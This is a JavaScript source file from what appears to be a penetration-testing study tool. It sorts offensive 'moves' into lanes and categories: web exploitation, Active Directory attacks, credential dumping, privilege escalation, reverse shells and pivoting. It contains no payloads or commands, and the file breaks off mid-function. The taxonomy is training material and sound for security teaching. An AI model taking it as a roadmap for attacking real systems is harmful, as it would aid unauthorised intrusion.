/*!
 * obol engine - study.js
 * Study mode's engine half. Pure functions over the loaded packs (OBOL.packs.actions()) + ARSENAL +
 * the embedded sample-output map (OBOL.STUDY_FIXTURES).
 *
 * The conditional "study cell" is DERIVED, not hand-authored: every field maps to data the move
 * already carries - hypothesis / requires_* / produces / does_not_prove / commands[].note / refs -
 * plus two graph walks (what mints my prereqs, what my output opens). The one non-pack piece is the
 * sample output; a move with no fixture still produces a full cell (the Watch replay just shows no
 * streamed output yet). Each fixture pins the exact command its output came from (cmd/tool), so the
 * Watch replay always types the command that produced the result shown - command and output are one
 * coherent run, never a sample paired against a different command.
 *
 * Lanes are the methodology taxonomy: every move is auto-assigned to a lane from its source pack and
 * topologically ordered within it, so all 167 moves are navigable. Scenarios are curated cross-lane
 * paths. Command variants are ordered REMOTE-FIRST from each tool's ARSENAL os/class.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  // --- the lane taxonomy: every move lands in exactly one lane, grouped by source pack ----------
  var LANE_DEFS = [
    { key: 'recon', name: 'Recon & Enumeration', short: 'Recon', packs: ['recon'], desc: 'Map the attack surface, ports, services, shares, and the web.' },
    { key: 'web', name: 'Web Exploitation', short: 'Web', packs: ['web', 'web_exploit_checks'], desc: 'Turn a web app into a shell, map it, find the injectable edge, land code execution.' },
    { key: 'checks', name: 'Service & Web Checks', short: 'Checks', packs: ['findings_checks'], desc: 'Fast, safe checks that surface misconfigurations and version leads.' },
    { key: 'ad', name: 'Active Directory', short: 'AD', packs: ['ad'], desc: 'From an anonymous foothold to owning the domain.' },
    { key: 'creds', name: 'Credentials & Cracking', short: 'Creds', packs: ['cracking', 'credential_access'], desc: 'Capture, relay, and crack credentials into usable access.' },
    { key: 'linux', name: 'Linux Privilege Escalation', short: 'Linux', packs: ['linux_privesc'], desc: 'From a low-priv shell to root.' },
    { key: 'windows', name: 'Windows Privilege Escalation', short: 'Windows', packs: ['windows_privesc'], desc: 'From a foothold to SYSTEM.' },
    { key: 'database', name: 'Databases', short: 'DB', packs: ['database'], desc: 'Enumerate and abuse database services.' },
    { key: 'shells', name: 'Shells & Transfer', short: 'Shells', packs: ['shells'], desc: 'Get a stable interactive shell and move files on and off the box.' },
    { key: 'pivot', name: 'Pivoting & Tunneling', short: 'Pivot', packs: ['pivoting', 'obol_local_pivot'], desc: 'Reach deeper networks through a compromised host.' },
    { key: 'proof', name: 'Flags & Proof', short: 'Proof', packs: ['obol_flag_hunt'], desc: 'Hunt the flags and capture the proof the report needs.' },
  ];
  var LANE_KEYS = LANE_DEFS.map(function (d) { return d.key; });

  function allMoves() { try { return (OBOL.packs && OBOL.packs.actions()) || []; } catch (e) { return []; } }
  function arsenal() { return OBOL.ARSENAL || {}; }
  function fixtures() { return OBOL._studyFx || (OBOL._studyFx = Object.assign({}, OBOL.STUDY_FIXTURES || {})); }
  function byId(id) { var a = allMoves(); for (var i = 0; i < a.length; i++) if (a[i].id === id) return a[i]; return null; }
  function reqSet(m) { return [].concat(m.requires_all || [], m.requires_any || []); }

  // id → pack basename (e.g. 'ad'), from the loaded pack bundle
  var _packOf = null;
  function packOf(id) {
    if (!_packOf) {
      _packOf = {};
      try {
        var pd = OBOL.packs.packData();
        Object.keys(pd).forEach(function (name) {
          var p = pd[name]; if (!p || !Array.isArray(p.actions)) return;
          var base = name.replace(/_\d{4}_\d{2}$/, '');
          p.actions.forEach(function (a) { _packOf[a.id] = base; });
        });
      } catch (e) {}
    }
    return _packOf[id] || '';
  }
  var _packToLane = null;
  function laneKeyForPack(base) {
    if (!_packToLane) { _packToLane = {}; LANE_DEFS.forEach(function (d) { d.packs.forEach(function (p) { _packToLane[p] = d.key; }); }); }
    return _packToLane[base] || 'recon';
  }
  // a few moves live in a pack that doesn't match their nature (nmap scans ship in the AD pack) -
  // reassign by id so the taxonomy reads right.
  function laneForMove(m) {
    if (/^nmap-/.test(m.id)) return 'recon';
    return laneKeyForPack(packOf(m.id));
  }

  // coarse stage label for a move, from the fact it mints (used as the phase chip at scale)
  // canonical stage labels, so synonyms (creds/credentials, priv/privesc/escalate, pivot/lateral) never
  // show up as two different headers in the rail or the atlas.
  var STAGE_ALIAS = {
    recon: 'Recon', web: 'Web', foothold: 'Foothold', access: 'Foothold', shell: 'Foothold',
    cred: 'Credentials', creds: 'Credentials', credential: 'Credentials', credentials: 'Credentials',
    priv: 'Escalate', privesc: 'Escalate', escalate: 'Escalate', escalation: 'Escalate',
    lateral: 'Lateral', pivot: 'Lateral', loot: 'Loot', proof: 'Proof', flag: 'Proof',
    enum: 'Enumeration', enumeration: 'Enumeration', recon: 'Recon', persistence: 'Persistence',
    ad: 'Active Directory', 'active directory': 'Active Directory', domain: 'Active Directory',
  };
  function canonStage(s) { var k = String(s || '').toLowerCase().trim(); return STAGE_ALIAS[k] || (s ? cap1(s) : ''); }
  function stageOfFact(p) {
    if (/^(persistence\.)/.test(p)) return 'Persistence';
    if (/^access\.(admin|system|root)/.test(p) || p === 'access.admin' || p === 'access.system' || /^privesc\./.test(p)) return 'Escalate';
    if (/^(foothold\.|access\.shell|db\.session|listener\.)/.test(p)) return 'Foothold';
    if (/^(hash\.|credential\.|db\.cred|kerberos\.)/.test(p)) return 'Credentials';
    if (/^(objective|flag|proof)/.test(p)) return 'Proof';
    if (/^loot\./.test(p)) return 'Loot';
    if (/^tunnel\./.test(p)) return 'Lateral';
    if (/^ad\./.test(p)) return 'Active Directory';
    if (/^web\./.test(p)) return 'Web';
    if (/^defense\./.test(p)) return 'Enumeration';
    if (/^(scan\.|host\.|ports|service\.)/.test(p) || /\.reachable$/.test(p)) return 'Recon';
    return '';
  }
  // when a move declares no output (or none that classifies), fall back to its lane's natural stage.
  var LANE_STAGE = { recon: 'Recon', web: 'Web', checks: 'Enumeration', ad: 'Active Directory', creds: 'Credentials', linux: 'Escalate', windows: 'Escalate', database: 'Foothold', shells: 'Foothold', pivot: 'Lateral', proof: 'Proof' };
  function deriveStage(m) {
    if (m.phase) return canonStage(m.phase);
    var prod = m.produces || [];
    for (var i = 0; i < prod.length; i++) { var st = stageOfFact(prod[i]); if (st) return st; }
    return LANE_STAGE[laneForMove(m)] || '';
  }
  function cap1(s) { s = String(s || ''); return s.charAt(0).toUpperCase() + s.slice(1); }

  // --- topical categories: group reasonably-related moves together in the rail ("all the SQL in one
  //     place"), rather than by coarse attack stage. A move with no category falls back to its stage,
  //     so lanes not yet categorized still render. CATEGORY_ORDER sets the section order in the rail. ---
  var MOVE_CATEGORY = {
    // web lane
    'vhost-discovery': 'Recon & Discovery', 'content-discovery': 'Recon & Discovery', 'param-discovery': 'Recon & Discovery', 'nikto-scan': 'Recon & Discovery', 'web-access-blocked': 'Recon & Discovery', 'whatweb-fingerprint': 'Recon & Discovery', 'feroxbuster-dir': 'Recon & Discovery', 'gobuster-dir': 'Recon & Discovery', 'robots-sitemap-check': 'Recon & Discovery', 'virtual-host-fuzz': 'Recon & Discovery',
    'sqli-basics': 'SQL Injection', 'manual-sqli-exploitation': 'SQL Injection', 'sqlmap-automation': 'SQL Injection', 'sqli-union-dump': 'SQL Injection', 'sqli-error-boolean': 'SQL Injection', 'sqli-auth-bypass': 'SQL Injection', 'sqli-file-read-write': 'SQL Injection', 'second-order-sqli': 'SQL Injection',
    'file-upload': 'Upload, Inclusion & Shells', 'lfi-probe': 'Upload, Inclusion & Shells', 'lfi-secret-harvest': 'Upload, Inclusion & Shells', 'web-shells': 'Upload, Inclusion & Shells', 'http-put-webshell': 'Upload, Inclusion & Shells', 'lfi-log-poisoning': 'Upload, Inclusion & Shells', 'lfi-php-filter': 'Upload, Inclusion & Shells', 'lfi-proc-environ': 'Upload, Inclusion & Shells', 'rfi-inclusion': 'Upload, Inclusion & Shells', 'upload-extension-bypass': 'Upload, Inclusion & Shells', 'upload-magic-bytes': 'Upload, Inclusion & Shells', 'zip-slip-upload': 'Upload, Inclusion & Shells',
    'command-injection': 'Command & Template Injection', 'ssti': 'Command & Template Injection', 'ssti-to-rce': 'Command & Template Injection', 'prototype-pollution': 'Command & Template Injection', 'blind-cmdi-oob': 'Command & Template Injection', 'crlf-header-injection': 'Command & Template Injection', 'ssi-injection': 'Command & Template Injection', 'xpath-injection': 'Command & Template Injection', 'ldap-web-injection': 'Command & Template Injection',
    'ssrf': 'SSRF, XXE & Deserialization', 'xxe': 'SSRF, XXE & Deserialization', 'deserialization': 'SSRF, XXE & Deserialization', 'aws-credential-abuse': 'SSRF, XXE & Deserialization', 'azure-imds': 'SSRF, XXE & Deserialization', 'gcp-metadata': 'SSRF, XXE & Deserialization', 'http-request-smuggling': 'SSRF, XXE & Deserialization', 'xxe-oob-exfil': 'SSRF, XXE & Deserialization', 'php-deserialization': 'SSRF, XXE & Deserialization', 'python-pickle-deser': 'SSRF, XXE & Deserialization', 'dotnet-viewstate-deser': 'SSRF, XXE & Deserialization', 'ssrf-internal-scan': 'SSRF, XXE & Deserialization', 'ssrf-gopher-redis': 'SSRF, XXE & Deserialization',
    'idor': 'Auth & Access Control', 'idor-harvest': 'Auth & Access Control', 'jwt-attacks': 'Auth & Access Control', 'nosql-injection': 'Auth & Access Control', 'verb-tampering': 'Auth & Access Control', 'graphql-abuse': 'Auth & Access Control', 'mass-assignment': 'Auth & Access Control', 'authz-abuse': 'Auth & Access Control', 'web-login-brute': 'Auth & Access Control', 'default-web-creds': 'Auth & Access Control', 'password-reset-poison': 'Auth & Access Control', 'oauth-redirect-abuse': 'Auth & Access Control', 'session-fixation-cookie': 'Auth & Access Control', 'race-condition-web': 'Auth & Access Control',
    'xss-basics': 'Cross-Site Scripting', 'xss-session-steal': 'Cross-Site Scripting', 'csrf-action-forge': 'Cross-Site Scripting', 'open-redirect': 'Cross-Site Scripting', 'cors-exploit': 'Cross-Site Scripting',
    'git-exposed': 'Source Exposure', 'svn-exposed': 'Source Exposure', 'env-backup-leak': 'Source Exposure', 'ds-store-parse': 'Source Exposure', 'source-map-unpack': 'Source Exposure',
    'tomcat-deploy': 'App Servers & Known CVEs', 'jenkins-access': 'App Servers & Known CVEs', 'wordpress': 'App Servers & Known CVEs', 'check-log4shell': 'App Servers & Known CVEs', 'check-struts2': 'App Servers & Known CVEs', 'ajp-ghostcat': 'App Servers & Known CVEs', 'java-rmi': 'App Servers & Known CVEs',
    'shellshock': 'App Servers & Known CVEs', 'heartbleed': 'App Servers & Known CVEs', 'drupalgeddon2': 'App Servers & Known CVEs', 'phpmyadmin-lfi': 'App Servers & Known CVEs', 'webmin-rce': 'App Servers & Known CVEs', 'usermin-rce': 'App Servers & Known CVEs', 'ofbiz-deser': 'App Servers & Known CVEs', 'cacti-cmdinjection': 'App Servers & Known CVEs', 'zabbix-script-rce': 'App Servers & Known CVEs', 'splunk-app-rce': 'App Servers & Known CVEs', 'text4shell': 'App Servers & Known CVEs',
    'spring4shell': 'App Servers & Known CVEs', 'spring-actuator-jolokia': 'App Servers & Known CVEs', 'grafana-file-read': 'App Servers & Known CVEs', 'gitlab-exiftool-rce': 'App Servers & Known CVEs', 'confluence-ognl-rce': 'App Servers & Known CVEs', 'jboss-jmx-deploy': 'App Servers & Known CVEs', 'weblogic-rce': 'App Servers & Known CVEs', 'coldfusion-lfi-rce': 'App Servers & Known CVEs', 'iis-tilde-shortname': 'App Servers & Known CVEs', 'webdav-put-test': 'App Servers & Known CVEs', 'werkzeug-console-rce': 'App Servers & Known CVEs', 'laravel-ignition-rce': 'App Servers & Known CVEs', 'nostromo-path-rce': 'App Servers & Known CVEs', 'apache-path-traversal': 'App Servers & Known CVEs', 'haraka-smtp-rce': 'App Servers & Known CVEs', 'nvms1000-traversal': 'App Servers & Known CVEs', 'gym-mgmt-upload': 'App Servers & Known CVEs',
    // recon lane
    'nmap-fast-open-ports': 'Port Scanning', 'nmap-version-scripts': 'Port Scanning', 'nmap-vuln-scripts': 'Port Scanning', 'nmap-udp-top': 'Port Scanning', 'nmap-host-unresponsive': 'Port Scanning', 'recon-arp-sweep': 'Port Scanning',
    'recon-smb-anon': 'SMB, RDP & Web', 'recon-smb-signing': 'SMB, RDP & Web', 'smbv1-vuln-verify': 'SMB, RDP & Web', 'rdp-enum': 'SMB, RDP & Web', 'recon-rdp-nla': 'SMB, RDP & Web', 'recon-web-triage': 'SMB, RDP & Web', 'fix-name-resolution': 'SMB, RDP & Web',
    'recon-dns': 'DNS, SNMP & VPN', 'recon-snmp': 'DNS, SNMP & VPN', 'recon-snmp-walk': 'DNS, SNMP & VPN', 'recon-ike-vpn': 'DNS, SNMP & VPN', 'ipmi-hash-dump': 'DNS, SNMP & VPN',
    'recon-smtp': 'Mail Services', 'smtp-open-relay': 'Mail Services', 'recon-mail': 'Mail Services', 'pop3-imap-read': 'Mail Services',
    'recon-ftp': 'File Shares', 'recon-ftp-banner': 'File Shares', 'nfs-enum': 'File Shares', 'recon-nfs-mounts': 'File Shares', 'nfs-to-foothold': 'File Shares', 'recon-rsync': 'File Shares', 'rsync-write-shell': 'File Shares', 'recon-tftp': 'File Shares', 'tftp-write-shell': 'File Shares', 'ftp-upload-webshell': 'File Shares', 'ftp-bounce': 'File Shares', 'svn-repo-enum': 'File Shares',
    'recon-finger': 'Legacy & Remote Access', 'recon-vnc': 'Legacy & Remote Access', 'vnc-desktop-shell': 'Legacy & Remote Access', 'recon-telnet': 'Legacy & Remote Access', 'telnet-login': 'Legacy & Remote Access', 'recon-rservices': 'Legacy & Remote Access', 'rservices-login': 'Legacy & Remote Access', 'recon-x11': 'Legacy & Remote Access', 'x11-keylog': 'Legacy & Remote Access', 'ssh-key-troubleshoot': 'Legacy & Remote Access',
    'vsftpd-backdoor': 'Service Exploits (CVE)', 'proftpd-modcopy': 'Service Exploits (CVE)', 'samba-usermap': 'Service Exploits (CVE)', 'smbghost': 'Service Exploits (CVE)', 'bluekeep': 'Service Exploits (CVE)', 'freeswitch-esl': 'Service Exploits (CVE)', 'jdwp-debug': 'Service Exploits (CVE)', 'aerospike-udf': 'Service Exploits (CVE)', 'wifi-mouse-rce': 'Service Exploits (CVE)', 'unrealircd-backdoor': 'Service Exploits (CVE)', 'distccd-rce': 'Service Exploits (CVE)', 'activemq-openwire-rce': 'Service Exploits (CVE)', 'james-admin-rce': 'Service Exploits (CVE)',
    // creds lane
    'crack-identify': 'Hash Cracking', 'crack-hash-troubleshoot': 'Hash Cracking', 'crack-ntlm': 'Hash Cracking', 'crack-netntlmv2': 'Hash Cracking', 'crack-kerberoast': 'Hash Cracking',
    'crack-asrep-offline': 'Hash Cracking', 'crack-shadow': 'Hash Cracking', 'crack-mscache2': 'Hash Cracking', 'crack-archive': 'Hash Cracking', 'crack-modular-hash': 'Hash Cracking',
    'cred-crack-asrep': 'Hash Cracking', 'cred-crack-tgs': 'Hash Cracking', 'cred-crack-ntlm': 'Hash Cracking', 'cred-crack-netntlm': 'Hash Cracking', 'cred-crack-shadow': 'Hash Cracking', 'cred-crack-sshkey': 'Hash Cracking', 'cred-crack-zip': 'Hash Cracking', 'cred-crack-keepass': 'Hash Cracking', 'cred-crack-dcc2': 'Hash Cracking', 'dpapi-masterkey-cred': 'Hash Cracking',
    'online-brute-ssh': 'Online Brute-Force', 'blind-brute-ssh': 'Online Brute-Force', 'online-brute-ftp': 'Online Brute-Force', 'online-brute-rdp': 'Online Brute-Force', 'ssh-user-enum': 'Online Brute-Force',
    'responder-poison': 'Poisoning & Relay', 'responder-tune': 'Poisoning & Relay', 'ntlm-relay-attack': 'Poisoning & Relay', 'relay-target-signing': 'Poisoning & Relay', 'mitm6-ipv6-takeover': 'Poisoning & Relay',
    // linux lane
    'linux-enum': 'Enumeration', 'linux-privesc-triage': 'Enumeration', 'pspy-monitor': 'Enumeration', 'linux-loot-hunt': 'Enumeration', 'linux-internal-services': 'Enumeration', 'linux-ssh-keys': 'Enumeration', 'linux-root-cred-harvest': 'Enumeration',
    'sudo-abuse': 'Sudo, SUID & Capabilities', 'suid-gtfobins': 'Sudo, SUID & Capabilities', 'linux-suid-enum': 'Sudo, SUID & Capabilities', 'capabilities': 'Sudo, SUID & Capabilities', 'linux-capabilities': 'Sudo, SUID & Capabilities', 'linux-ld-preload': 'Sudo, SUID & Capabilities', 'linux-env-hijack': 'Sudo, SUID & Capabilities', 'npm-package-privesc': 'Sudo, SUID & Capabilities', 'doas-conf-abuse': 'Sudo, SUID & Capabilities', 'shared-obj-hijack': 'Sudo, SUID & Capabilities',
    'cron-abuse': 'Cron & Writable Files', 'linux-cron-watch': 'Cron & Writable Files', 'writable-passwd': 'Cron & Writable Files', 'writable-etc-shadow-sudoers': 'Cron & Writable Files', 'linux-passwd-shadow': 'Cron & Writable Files', 'nfs-squash': 'Cron & Writable Files', 'linux-nfs-root-squash': 'Cron & Writable Files', 'linux-path-hijack': 'Cron & Writable Files', 'wildcard-injection': 'Cron & Writable Files', 'systemd-timer-abuse': 'Cron & Writable Files', 'python-library-hijack': 'Cron & Writable Files', 'logrotate-race': 'Cron & Writable Files', 'writable-etc-scripts': 'Cron & Writable Files',
    'lxc-lxd-escape': 'Container Escape', 'docker-socket': 'Container Escape', 'linux-docker-lxd': 'Container Escape', 'container-escape': 'Container Escape', 'kubernetes-pod-escape': 'Container Escape',
    'linux-kernel-exploit': 'Kernel & LPE CVEs', 'linux-kernel-suggest': 'Kernel & LPE CVEs', 'polkit-abuse': 'Kernel & LPE CVEs', 'privesc-polkit-pkexec': 'Kernel & LPE CVEs', 'privesc-CVE-2023-22809': 'Kernel & LPE CVEs', 'privesc-screen-450': 'Kernel & LPE CVEs', 'dirtycow': 'Kernel & LPE CVEs', 'dirtypipe': 'Kernel & LPE CVEs', 'baron-samedit': 'Kernel & LPE CVEs',
    'linux-persistence': 'Persistence',
    // windows lane
    'windows-enum': 'Enumeration', 'win-privesc-triage': 'Enumeration', 'wesng-patch-gaps': 'Enumeration', 'defense-enum': 'Enumeration', 'bypass-amsi': 'Enumeration', 'win-interactive-shell': 'Enumeration',
    'seimpersonate': 'Token & Service Abuse', 'win-token-impersonation': 'Token & Service Abuse', 'potato-select': 'Token & Service Abuse', 'unquoted-service-path': 'Token & Service Abuse', 'weak-service-permissions': 'Token & Service Abuse', 'win-service-abuse': 'Token & Service Abuse', 'alwaysinstallelevated': 'Token & Service Abuse', 'win-registry-alwaysinstall': 'Token & Service Abuse', 'windows-dll-hijack': 'Token & Service Abuse', 'win-dll-hijack': 'Token & Service Abuse', 'windows-schtask-abuse': 'Token & Service Abuse', 'win-scheduled-tasks': 'Token & Service Abuse', 'uac-bypass': 'Token & Service Abuse', 'com-hijack': 'Token & Service Abuse', 'windows-service-dacl-abuse': 'Token & Service Abuse', 'windows-namedpipe-impersonation': 'Token & Service Abuse', 'sebackup-serestore': 'Token & Service Abuse', 'sebackup-serestore-abuse': 'Token & Service Abuse', 'runas-savedcred-exec': 'Token & Service Abuse', 'print-operators-privesc': 'Token & Service Abuse', 'server-operators-privesc': 'Token & Service Abuse', 'autorun-binary-hijack': 'Token & Service Abuse', 'wsl-local-privesc': 'Token & Service Abuse',
    'dpapi-secrets': 'Credential Dumping', 'win-dpapi-vault': 'Credential Dumping', 'stored-credentials': 'Credential Dumping', 'win-credential-hunt': 'Credential Dumping', 'windows-old-hives': 'Credential Dumping', 'lsass-dump-onbox': 'Credential Dumping', 'win-lsass-sam-dump': 'Credential Dumping', 'remote-app-creds': 'Credential Dumping', 'unattend-sysprep-creds': 'Credential Dumping', 'ps-history-transcript': 'Credential Dumping', 'iis-webconfig-creds': 'Credential Dumping', 'wifi-wlan-passwords': 'Credential Dumping',
    'windows-patch-exploit': 'Kernel & LPE CVEs', 'win-kernel-printnightmare': 'Kernel & LPE CVEs',
    'windows-persistence': 'Windows Persistence',
    // database lane
    'mysql-login': 'Relational databases', 'mysql-loot': 'Relational databases', 'mysql-outfile-rce': 'Relational databases', 'mysql-udf-privesc': 'Relational databases', 'mssql-login': 'Relational databases', 'mssql-xp-cmdshell': 'Relational databases', 'mssql-linked-server': 'Relational databases', 'mssql-impersonate-login': 'Relational databases', 'mssql-unc-hash-steal': 'Relational databases', 'mssql-clr-assembly': 'Relational databases', 'mssql-ole-automation': 'Relational databases', 'postgres-login': 'Relational databases', 'postgres-rce': 'Relational databases', 'postgres-file-read': 'Relational databases', 'postgres-large-object': 'Relational databases', 'oracle-tns': 'Relational databases', 'oracle-rce': 'Relational databases', 'sqlite-db-dump': 'Relational databases',
    'redis-enum': 'NoSQL, Cache & Search', 'redis-lua-sandbox': 'NoSQL, Cache & Search', 'mongo-enum': 'NoSQL, Cache & Search', 'elasticsearch-enum': 'NoSQL, Cache & Search', 'elasticsearch-rce': 'NoSQL, Cache & Search', 'memcached-enum': 'NoSQL, Cache & Search', 'couchdb-admin-party': 'NoSQL, Cache & Search', 'cassandra-cql-enum': 'NoSQL, Cache & Search',
    // shells lane
    'shell-listener': 'Reverse Shells', 'shell-revshell-linux': 'Reverse Shells', 'shell-revshell-windows': 'Reverse Shells', 'shell-bind': 'Reverse Shells', 'shell-msfvenom': 'Reverse Shells', 'shell-pty-upgrade': 'Reverse Shells', 'egress-blocked-shell': 'Reverse Shells', 'fix-no-tty': 'Reverse Shells',
    'ssh-key-login': 'Key & Credential Login', 'linux-remote-exec': 'Key & Credential Login', 'shell-transfer-linux': 'Key & Credential Login', 'shell-transfer-windows': 'Key & Credential Login', 'fix-tool-wont-run': 'Key & Credential Login',
    // pivot lane
    'local-linux-interfaces': 'Map the Foothold (Linux)', 'local-linux-routes': 'Map the Foothold (Linux)', 'local-linux-neighbors': 'Map the Foothold (Linux)', 'local-linux-dns': 'Map the Foothold (Linux)', 'local-linux-listeners': 'Map the Foothold (Linux)',
    'local-windows-interfaces': 'Map the Foothold (Windows)', 'local-windows-routes': 'Map the Foothold (Windows)', 'local-windows-neighbors': 'Map the Foothold (Windows)', 'local-windows-listeners': 'Map the Foothold (Windows)', 'local-windows-dns': 'Map the Foothold (Windows)',
    'pivot-chisel-socks': 'Build the Tunnel', 'pivot-chisel': 'Build the Tunnel', 'pivot-ligolo': 'Build the Tunnel', 'pivot-sshuttle': 'Build the Tunnel', 'pivot-ssh-dynamic': 'Build the Tunnel', 'pivot-ssh-portforward': 'Build the Tunnel', 'pivot-ssh-local': 'Build the Tunnel', 'pivot-socat': 'Build the Tunnel', 'pivot-netsh': 'Build the Tunnel', 'dns-tunnel': 'Build the Tunnel',
    'pivot-scan-through': 'Work Through the Pivot', 'pivot-proxychains': 'Work Through the Pivot',
    // checks lane
    'check-tls-config': 'TLS & Cleartext', 'check-http-redirect': 'TLS & Cleartext',
    'check-http-methods': 'HTTP Verbs & CORS', 'check-cors': 'HTTP Verbs & CORS',
    'check-web-headers': 'Headers & Fingerprint', 'check-web-components': 'Headers & Fingerprint', 'check-cms-version': 'Headers & Fingerprint',
    'check-web-body': 'Page Body & Exposed Files', 'check-exposed-files': 'Page Body & Exposed Files',
    'check-subdomain-takeover': 'DNS & Email', 'check-dns-email': 'DNS & Email',
    // ad lane
    'ad-dc-identify': 'AD Recon & Enumeration', 'ad-anon-ldap-enum': 'AD Recon & Enumeration', 'ldap-deep-enum': 'AD Recon & Enumeration', 'ad-user-enum': 'AD Recon & Enumeration', 'ad-group-enum': 'AD Recon & Enumeration', 'ad-session-enum': 'AD Recon & Enumeration', 'domain-policy-enum': 'AD Recon & Enumeration', 'bloodhound-collect': 'AD Recon & Enumeration', 'ad-path-manual': 'AD Recon & Enumeration', 'nxc-arsenal': 'AD Recon & Enumeration', 'powerview-enum': 'AD Recon & Enumeration', 'ad-legacy-enum': 'AD Recon & Enumeration', 'ad-psdotnet-enum': 'AD Recon & Enumeration', 'trust-enum': 'AD Recon & Enumeration', 'ad-trust-enum': 'AD Recon & Enumeration', 'fix-clock-skew': 'AD Recon & Enumeration', 'rpc-endpoint-abuse': 'AD Recon & Enumeration',
    'asrep-roast': 'Credential Harvesting', 'crack-asrep': 'Credential Harvesting', 'kerberoast': 'Credential Harvesting', 'crack-tgs': 'Credential Harvesting', 'password-spray': 'Credential Harvesting', 'validate-credential': 'Credential Harvesting', 'account-password-change': 'Credential Harvesting', 'auth-account-blocked': 'Credential Harvesting', 'fix-samr-null-denied': 'Credential Harvesting', 'gpp-passwords': 'Credential Harvesting', 'smb-share-inventory': 'Credential Harvesting', 'smb-share-browse-download': 'Credential Harvesting', 'spider-secrets': 'Credential Harvesting', 'timeroasting': 'Credential Harvesting',
    'kerberos-tickets': 'Kerberos Tickets', 'kerberos-tgt-obtain': 'Kerberos Tickets', 'kerberos-spn-fix': 'Kerberos Tickets', 'ntlm-disabled-kerberos': 'Kerberos Tickets', 'silver-ticket': 'Kerberos Tickets', 'golden-ticket': 'Kerberos Tickets', 'diamond-ticket': 'Kerberos Tickets',
    'ad-acl-abuse': 'ACL & Object Abuse', 'ad-dacl-abuse': 'ACL & Object Abuse', 'bloodyad-acl': 'ACL & Object Abuse', 'fix-acl-reauth': 'ACL & Object Abuse', 'shadow-credentials': 'ACL & Object Abuse', 'adcs-shadow-creds': 'ACL & Object Abuse', 'gmsa-read': 'ACL & Object Abuse', 'ad-gmsa-abuse': 'ACL & Object Abuse', 'laps-read': 'ACL & Object Abuse', 'ad-laps-read': 'ACL & Object Abuse',
    'delegation-abuse': 'Delegation & Coercion', 'constrained-delegation': 'Delegation & Coercion', 'rbcd-attack': 'Delegation & Coercion', 'unconstrained-delegation': 'Delegation & Coercion', 'getst-impersonation': 'Delegation & Coercion', 'coerce-auth': 'Delegation & Coercion', 'coercer-petitpotam': 'Delegation & Coercion', 'ntlm-relay-capture': 'Delegation & Coercion', 'kerberos-relay': 'Delegation & Coercion',
    'adcs-esc': 'ADCS Abuse', 'certipy-find': 'ADCS Abuse', 'adcs-esc4-template': 'ADCS Abuse', 'adcs-esc8-relay': 'ADCS Abuse', 'cert-authenticate': 'ADCS Abuse', 'certifried': 'ADCS Abuse', 'adcs-certifried': 'ADCS Abuse',
    'lateral-exec': 'Lateral Movement', 'pass-the-hash': 'Lateral Movement', 'cred-reuse-sweep': 'Lateral Movement', 'ticket-reuse': 'Lateral Movement',
    'dump-secrets': 'Dumping & Domain Dominance', 'dcsync': 'Dumping & Domain Dominance', 'own-domain-pth': 'Dumping & Domain Dominance', 'sid-history-abuse': 'Dumping & Domain Dominance',
    'zerologon-check': 'AD CVEs', 'zerologon-exploit': 'AD CVEs', 'eternalblue': 'AD CVEs', 'nopac': 'AD CVEs', 'printnightmare': 'AD CVEs', 'ms14-068': 'AD CVEs',
    'gpo-abuse': 'Service & Policy Abuse', 'dnsadmins-abuse': 'Service & Policy Abuse', 'wsus-abuse': 'Service & Policy Abuse', 'sccm-enum': 'Service & Policy Abuse', 'sccm-exploit': 'Service & Policy Abuse', 'adidns-abuse': 'Service & Policy Abuse',
    // proof lane
    'flag-hunt-linux': 'Proof & Capture', 'flag-hunt-root-linux': 'Proof & Capture', 'flag-hunt-windows': 'Proof & Capture', 'flag-hunt-root-windows': 'Proof & Capture', 'post-proof-loot-sweep': 'Proof & Capture',
  };
  var CATEGORY_ORDER = [
    // web
    'Recon & Discovery', 'SQL Injection', 'Upload, Inclusion & Shells', 'Command & Template Injection',
    'SSRF, XXE & Deserialization', 'Auth & Access Control', 'Cross-Site Scripting', 'Source Exposure', 'App Servers & Known CVEs',
    // recon
    'Port Scanning', 'SMB, RDP & Web', 'DNS, SNMP & VPN', 'Mail Services', 'File Shares', 'Legacy & Remote Access', 'Service Exploits (CVE)',
    // creds
    'Hash Cracking', 'Online Brute-Force', 'Poisoning & Relay',
    // linux
    'Enumeration', 'Sudo, SUID & Capabilities', 'Cron & Writable Files', 'Container Escape', 'Kernel & LPE CVEs', 'Persistence',
    // windows
    'Token & Service Abuse', 'Credential Dumping', 'Windows Persistence',
    // database
    'Relational databases', 'NoSQL, Cache & Search',
    // shells
    'Reverse Shells', 'Key & Credential Login',
    // pivot
    'Map the Foothold (Linux)', 'Map the Foothold (Windows)', 'Build the Tunnel', 'Work Through the Pivot',
    // checks
    'TLS & Cleartext', 'HTTP Verbs & CORS', 'Headers & Fingerprint', 'Page Body & Exposed Files', 'DNS & Email',
    // ad
    'AD Recon & Enumeration', 'Credential Harvesting', 'Kerberos Tickets', 'ACL & Object Abuse', 'Delegation & Coercion',
    'ADCS Abuse', 'Lateral Movement', 'Dumping & Domain Dominance', 'AD CVEs', 'Service & Policy Abuse',
    // proof
    'Proof & Capture',
  ];
  function categoryOf(moveId) { var m = byId(moveId); return MOVE_CATEGORY[moveId] || deriveStage(m || {}); }

  // --- build the atlas lanes (all moves, topologically ordered within each lane) ----------------
  var _lanes = null;
  function buildLanes() {
    if (_lanes) return _lanes;
    var moves = allMoves();
    var buckets = {}; LANE_KEYS.forEach(function (k) { buckets[k] = []; });
    moves.forEach(function (m) { var k = laneForMove(m); (buckets[k] || buckets.recon).push(m); });
    _lanes = LANE_DEFS.map(function (d) {
      var ordered = topoOrder(buckets[d.key] || []);
      return {
        key: d.key, name: d.name, short: d.short, desc: d.desc,
        nodes: ordered.map(function (m) { return { id: m.id, title: m.title, phase: deriveStage(m), proves: m.produces || [], reqs: reqSet(m) }; }),
      };
    }).filter(function (L) { return L.nodes.length; });
    return _lanes;
  }
  // order so a move follows the in-lane moves that mint its prerequisites; stable on pack order otherwise
  function topoOrder(moves) {
    var produced = {}, out = [], remaining = moves.slice();
    var inLaneProducts = {};
    moves.forEach(function (m) { (m.produces || []).forEach(function (p) { inLaneProducts[p] = true; }); });
    function depsMet(m) {
      var reqs = reqSet(m);
      return reqs.every(function (r) { return !inLaneProducts[r] || produced[r]; });
    }
    var guard = 0;
    while (remaining.length && guard++ < 10000) {
      var picked = -1;
      for (var i = 0; i < remaining.length; i++) { if (depsMet(remaining[i])) { picked = i; break; } }
